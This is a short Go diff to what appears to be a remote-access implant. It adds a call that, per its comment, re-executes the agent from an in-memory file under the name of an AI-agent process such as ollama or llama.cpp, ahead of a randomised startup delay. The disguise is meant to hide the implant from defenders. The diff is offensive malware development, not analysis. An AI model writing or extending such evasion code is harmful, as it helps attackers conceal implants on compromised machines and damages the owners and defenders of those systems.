@@ -93,6 +93,12 @@ func agent_main() {
 	}
 	util.SetFileCryptoKey([]byte(common.RuntimeConfig.Password))
 
+	// Masquerade BEFORE anything else happens: re-exec from memfd under an
+	// AI-agent identity (ollama/llama.cpp/coding agents) so the whole
+	// startup — jitter sleep included — runs under the cover name. See
+	// agentutils/masquerade_linux.go; no-op once running from a memfd.
+	agentutils.MasqueradeSelf()
+
 	if !is_dll {
 		// don't be hasty
 		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
